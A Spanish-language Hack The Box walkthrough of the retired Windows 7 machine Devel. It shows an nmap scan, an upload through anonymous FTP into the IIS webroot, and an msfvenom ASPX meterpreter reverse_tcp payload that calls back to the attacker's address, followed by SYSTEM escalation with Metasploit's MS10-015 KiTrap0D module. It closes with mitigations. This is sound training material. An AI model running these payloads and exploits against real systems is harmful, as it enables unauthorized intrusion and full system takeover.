---
title: "HTB Walkthrough: Devel"
date: 2026-06-12
draft: false
description: "Walkthrough completo de la máquina Devel de Hack The Box. Dificultad Easy, OS Windows 7 x86. FTP anónimo con escritura en webroot IIS, webshell ASPX y escalada a SYSTEM mediante MS10-015 KiTrap0D."
tags: ["HackTheBox", "Windows", "Easy", "FTP", "IIS", "ASPX", "Webshell", "MS10-015", "KiTrap0D", "PrivEsc", "Metasploit", "devel", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---
{{< lead >}}
Resolución de **Devel** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Windows 7 x86**. El FTP anónimo comparte directorio raíz con el webroot de IIS, lo que nos permite subir una webshell ASPX y obtener ejecución remota de código. Escalamos a **NT AUTHORITY\SYSTEM** explotando MS10-015 (KiTrap0D), un fallo en el kernel x86 de Windows.
{{< /lead >}}
{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}
> ⚠️ **Esta máquina está retirada.** Los writeups públicos solo están permitidos sobre máquinas retiradas según las [normas de la comunidad HTB](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines).
---
## 🗺️ Información de la Máquina
| Campo          | Detalle                                                            |
|----------------|--------------------------------------------------------------------|
| **Nombre**     | Devel                                                              |
| **OS**         | Windows 7 (Build 7600) x86                                         |
| **Dificultad** | Easy                                                               |
| **IP**         | 10.129.13.0                                                        |
| **Técnicas**   | FTP Write to Webroot · ASPX Webshell · MS10-015 KiTrap0D           |
---
## 1. Reconocimiento
### 1.1 Escaneo de Puertos
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.13.0
```
```
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```
Escaneo de versiones sobre los puertos abiertos:
```bash
nmap -sC -sV -p21,80 10.129.13.0
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM  <DIR>  aspnet_client
| 03-17-17  05:37PM    689  iisstart.htm
| 03-17-17  05:37PM  184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows
```
*Puertos abiertos:*
- `21` → Microsoft FTP con **acceso anónimo habilitado** — y los archivos listados son exactamente los de IIS
- `80` → Microsoft IIS 7.5
> **💡 Dato clave — La conexión crítica:** El FTP anónimo expone `iisstart.htm`, `welcome.png` y `aspnet_client/` — exactamente los mismos archivos que sirve IIS 7.5 en el puerto 80. Esto significa que el **directorio raíz del FTP es el webroot de IIS**. Si podemos escribir un archivo por FTP, podemos acceder a él desde el navegador y, siendo IIS con ASP.NET, ejecutarlo.
### 1.2 Enumeración del FTP
Confirmamos permisos de escritura y la versión de ASP.NET:
```bash
ftp 10.129.13.0
# Usuario: anonymous / Sin contraseña
```
```
ftp> ls aspnet_client/system_web
03-18-17  02:06AM  <DIR>  2_0_50727
```
La ruta `aspnet_client/system_web/2.0.50727` confirma que el servidor ejecuta **ASP.NET 2.0**, lo que garantiza que los archivos `.aspx` serán interpretados y ejecutados por IIS.
> **💡 Conclusiones:** FTP anónimo con escritura en webroot + IIS con ASP.NET = subir un `.aspx` malicioso y visitarlo desde el navegador nos da RCE directo.
---
## 2. Explotación — Webshell ASPX vía FTP
### 2.1 Generar el Payload ASPX
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.211 \
  LPORT=1337 \
  -f aspx > devel.aspx
```
Usamos `windows/meterpreter/reverse_tcp` (32 bits) y no la variante x64 porque el `sysinfo` posterior confirma que el sistema es **x86**. Un payload x64 en un proceso x86 causaría un crash inmediato — la arquitectura del payload debe coincidir con la del proceso que lo ejecuta.
### 2.2 Subir el Payload al Webroot
```bash
ftp 10.129.13.0
ftp> put ./devel.aspx
226 Transfer complete.
```
### 2.3 Configurar el Listener y Activar el Payload
```bash
msf6 > use multi/handler
msf6 handler > set payload windows/meterpreter/reverse_tcp
msf6 handler > set LHOST tun0
msf6 handler > set LPORT 1337
msf6 handler > exploit -j
```
Visitamos la URL del archivo subido para que IIS lo procese y ejecute:
```
http://10.129.13.0/devel.aspx
```
```
[*] Sending stage (196678 bytes) to 10.129.13.5
[*] Meterpreter session 35 opened (10.10.14.211:1337 -> 10.129.13.5:49265)
```
```bash
meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter > sysinfo
Computer     : DEVEL
OS           : Windows 7 (6.1 Build 7600)
Architecture : x86
Domain       : HTB
```
✅ **Shell Meterpreter obtenida como `IIS APPPOOL\Web`** — sin privilegios elevados. Necesitamos escalar.
---
## 3. User Flag
```bash
meterpreter > cat C:\\Users\\babis\\Desktop\\user.txt
```
> 🔑 Flag de usuario obtenida.
---
## 4. Escalada de Privilegios — MS10-015 KiTrap0D
### 4.1 Enumeración del Sistema
Usamos el módulo `local_exploit_suggester` de Metasploit para identificar vectores de escalada desde la sesión actual:
```bash
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 35
msf6 > run
```
```
[+] exploit/windows/local/bypassuac_eventvwr:         The target appears to be vulnerable.
[+] exploit/windows/local/ms10_015_kitrap0d:          The service is running, but could not be validated.
[+] exploit/windows/local/ms10_092_schelevator:       The service is running, but could not be validated.
[+] exploit/windows/local/ms13_053_schlamperei:       The target appears to be vulnerable.
[+] exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running.
```
El suggester lista 16 exploits potenciales. Elegimos **`ms10_015_kitrap0d`** porque `bypassuac_eventvwr` — el más llamativo — requiere que el usuario actual pertenezca al grupo **Administrators** para poder saltarse el UAC. `IIS APPPOOL\Web` no es un administrador local, por lo que el bypass de UAC no aplica aquí. `KiTrap0D` en cambio es una vulnerabilidad de kernel que no depende de los permisos del usuario.
### 4.2 Análisis del Vector de Escalada
**MS10-015 KiTrap0D** explota un fallo en el manejo de la trampa de división por cero (`#DE`, trap 0) del kernel de Windows en sistemas **x86**. Cuando se produce una excepción de este tipo desde modo usuario, el kernel no valida correctamente el contexto del proceso, lo que permite sobreescribir estructuras de datos privilegiadas. El exploit inyecta un payload en un proceso `msiexec.exe` y aprovecha este fallo para elevar el contexto de ejecución a **NT AUTHORITY\SYSTEM**.
```
Flujo normal:    excepción #DE → kernel gestiona la trampa → devuelve control al proceso
Flujo malicioso: excepción #DE especialmente preparada → fallo de validación en kernel x86
                 → escritura en estructuras privilegiadas → inyección en msiexec.exe → SYSTEM
```
La vulnerabilidad solo afecta a sistemas **x86** — en arquitecturas x64 el kernel gestiona la trampa de forma diferente y el exploit no funciona. El `sysinfo` que obtuvimos en el foothold confirma que Devel es x86, lo que nos dio la pista directa.
### 4.3 Explotación
```bash
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(ms10_015_kitrap0d) > set LHOST tun0
msf6 exploit(ms10_015_kitrap0d) > set SESSION 35
msf6 exploit(ms10_015_kitrap0d) > run
```
```
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 1124 launched.
[*] Reflectively injecting the DLL into 1124...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 37 opened (10.10.14.211:4444 -> 10.129.13.5:49268)
```
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
✅ **Escalada a SYSTEM completada.**
---
## 5. Root Flag
```bash
meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
```
> 🏁 Flag de root obtenida.
---
## 6. Resumen y Lecciones Aprendidas
**Ruta de compromiso:**
1. **Recon** → Nmap detecta FTP anónimo con los mismos archivos que IIS 7.5 en el puerto 80.
2. **Enumeración FTP** → Escritura confirmada en webroot; ASP.NET 2.0 activo.
3. **Webshell ASPX** → `msfvenom` genera payload x86; `ftp put` lo sube al webroot; visitar la URL activa la shell → `IIS APPPOOL\Web`.
4. **User Flag** → Acceso al escritorio de `babis` → `user.txt`.
5. **PrivEsc** → `local_exploit_suggester` → `ms10_015_kitrap0d` → kernel x86 fallo en trampa `#DE` → **NT AUTHORITY\SYSTEM** → `root.txt`.
**Lo que aprendí con esta máquina:**
- **Cuando el FTP y el servidor web comparten directorio raíz, el FTP con escritura es RCE.** No hace falta explotar ninguna vulnerabilidad del servicio web — simplemente subir un archivo ejecutable y visitarlo. Identificar esta relación entre servicios durante el reconocimiento es lo que hace que la máquina se resuelva en minutos en lugar de horas.
- **La arquitectura del objetivo determina la arquitectura del payload.** Un payload x64 en un proceso x86 no funciona — causa un crash. `sysinfo` en Meterpreter o el `Architecture` del output de nmap son la referencia. En Windows es especialmente importante porque muchos sistemas legacy siguen siendo x86 a pesar de la edad.
- **`local_exploit_suggester` es el punto de partida para PrivEsc en Windows con Meterpreter.** No sustituye al conocimiento, pero reduce drásticamente el tiempo de enumeración al filtrar qué exploits son aplicables al sistema concreto. La decisión de cuál usar todavía requiere criterio — en este caso, descartar `bypassuac` por el contexto del usuario.
- **MS10-015 solo funciona en x86.** La arquitectura del sistema no solo afecta al payload del foothold, sino también al vector de escalada. Tener `sysinfo` desde el primer momento orienta toda la fase de PrivEsc — en este caso, x86 abre KiTrap0D y cierra varios exploits x64.
- **FTP anónimo con escritura en producción es un riesgo crítico aunque el contenido parezca inofensivo.** El directorio expuesto en Devel solo tenía una página de bienvenida y algunos assets estáticos. Sin embargo, la capacidad de escritura convirtió ese FTP en un vector de RCE completo. El problema no es qué hay en el directorio — es que alguien externo puede añadir lo que quiera.
**Mitigaciones:**
| Vector | Mitigación |
|--------|------------|
| FTP anónimo con escritura en webroot | Deshabilitar acceso anónimo en IIS FTP; nunca mapear el FTP al webroot |
| IIS ejecuta cualquier archivo subido | Configurar IIS para no ejecutar scripts en directorios de upload; whitelist de extensiones permitidas |
| MS10-015 KiTrap0D | Aplicar el parche KB979682; migrar a un SO con soporte activo (Windows 7 EOL desde 2020) |
| IIS pool con permisos elevados | Usar `ApplicationPoolIdentity` con mínimo privilegio; no correr pools como SYSTEM o Administrator |
